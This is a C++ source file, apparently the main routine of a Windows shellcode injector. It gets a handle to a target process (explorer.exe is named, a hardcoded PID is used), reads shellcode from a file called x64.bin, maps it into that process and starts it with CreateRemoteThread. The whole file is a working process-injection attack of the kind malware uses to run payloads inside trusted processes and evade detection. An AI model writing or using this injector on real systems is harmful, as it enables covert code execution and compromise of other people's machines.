#include "ProcessUtils.h"
#include "MemoryMapping.h"
#include "Common.h"
#include <iostream>

int main() {
	std::wstring wsTargetProcessName = L"explorer.exe";
	std::wstring wsShellcodePath = L"x64.bin";

	//HANDLE hTargetProcess = GetProcessHandleByNameW(wsTargetProcessName);
	HANDLE hTargetProcess = GetProcessHandleByPid(29072);
	if (hTargetProcess == nullptr) {
		std::cout << "Failed to get process handle for " << std::string(wsTargetProcessName.begin(), wsTargetProcessName.end()) << std::endl;
		return -1;
	}

	LPVOID lpShellcode = nullptr;
	DWORD dwShellcodeSize = 0;
	if (!GetFileDataW(wsShellcodePath, &lpShellcode, &dwShellcodeSize)) {
		std::cout << "Failed to read shellcode from file " << std::string(wsShellcodePath.begin(), wsShellcodePath.end()) << std::endl;
		CloseHandle(hTargetProcess);
		return -1;
	}

	LPVOID lpRemoteAddr = nullptr;
	if (!MappingShellcode(hTargetProcess, lpShellcode, dwShellcodeSize, &lpRemoteAddr)) {
		std::cout << "Failed to map shellcode into target process." << std::endl;
		VirtualFree(lpShellcode, 0, MEM_RELEASE);
		CloseHandle(hTargetProcess);
		return -1;
	}

	CreateRemoteThread(hTargetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpRemoteAddr, NULL, 0, NULL);
}